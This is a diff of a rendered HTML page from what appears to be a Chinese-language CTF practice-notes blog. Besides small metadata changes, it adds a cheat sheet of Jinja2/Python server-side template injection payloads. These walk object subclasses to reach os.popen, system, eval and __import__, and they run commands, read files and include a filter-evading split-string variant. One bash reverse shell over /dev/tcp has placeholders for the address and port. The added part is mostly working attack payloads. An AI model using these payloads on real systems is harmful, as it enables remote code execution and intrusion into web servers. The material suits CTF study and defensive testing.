@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240508002132271.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240508002101400.png">
 <meta property="article:published_time" content="2024-05-06T08:27:07.000Z">
-<meta property="article:modified_time" content="2024-05-07T16:22:39.440Z">
+<meta property="article:modified_time" content="2024-05-09T14:25:02.389Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -245,7 +245,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.5k words
+          4.4k words
         
       </span>
     
@@ -256,7 +256,7 @@
         
         
         
-          22 mins
+          37 mins
         
       </span>
     
@@ -387,6 +387,21 @@
 </li>
 <li><p>查询文件类</p>
 <figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/proc/self/cgroup&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="针对不容类的payload"><a href="#针对不容类的payload" class="headerlink" title="针对不容类的payload"></a>针对不容类的payload</h1><h2 id="os-wrap-close"><a href="#os-wrap-close" class="headerlink" title="os._wrap_close"></a>os._wrap_close</h2><p>rce</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;__subcl&#x27;</span>+<span class="hljs-string">&#x27;asses__&#x27;</span>]()[<span class="hljs-number">383</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__bui&#x27;</span>+<span class="hljs-string">&#x27;ltins__&#x27;</span>][<span class="hljs-string">&#x27;ev&#x27;</span>+<span class="hljs-string">&#x27;al&#x27;</span>](<span class="hljs-string">&quot;__im&quot;</span>+<span class="hljs-string">&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;</span>+<span class="hljs-string">&quot;pen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="os"><a href="#os" class="headerlink" title="os"></a>os</h2><ol>
+<li><p>rce</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">71</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">71</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br><br># eval<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>.<span class="hljs-symbol">__builtins__</span>.eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)<br>().<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-symbol">__init__</span>.func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )<br>object.<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-symbol">__init__</span>.func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )<br><br>#<span class="hljs-symbol">__import__</span><br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>.<span class="hljs-symbol">__builtins__</span>.<span class="hljs-symbol">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>反弹shell</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[71]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/地址/端口 0&gt;&amp;1&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><br></code></pre></td></tr></table></figure>
+
+<p>如果遇到这个不能执行，就使用bp 因为&amp; 会导致出错，也可以尝试使用<code>\</code></p>
+</li>
 </ol>
 
                 
